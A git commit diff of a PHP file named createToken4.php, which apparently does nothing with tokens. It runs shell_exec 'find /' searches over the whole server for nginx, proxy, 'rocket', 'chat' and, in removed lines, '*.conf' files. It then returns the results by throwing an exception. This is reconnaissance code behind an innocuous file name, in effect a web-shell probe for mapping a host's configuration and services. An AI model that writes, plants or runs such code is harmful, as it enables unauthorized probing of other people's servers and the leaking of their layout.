5324777024d3f767cd0a104f42c0956114cd8f46
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 21:35:28 +0100

    Update and rename createToken3.php to createToken4.php

--- createToken4.php
+++ createToken4.php
@@ -1,12 +1,9 @@
 <?php
 $output ='';
-$output =$output."\n /usr/... ".shell_exec (' ls /usr/ | xargs');
-$output =$output."\n find .conf ".shell_exec (' find / -name "*.conf" | xargs');
-$output =$output."\n find nginx ".shell_exec (' find / -name "nginx" | xargs');
 $output =$output."\n find proxy ".shell_exec (' find / -name "proxy" | xargs');
 $output =$output."\n find rocket ".shell_exec (' find / -name "rocket" | xargs');
 $output =$output."\n find chat ".shell_exec (' find / -name "chat" | xargs');
-
+$output =$output."\n find nginx ".shell_exec (' find / -name "nginx" | xargs');
 
 
 throw new Exception("\n SUCCESS  ". $output."\n");
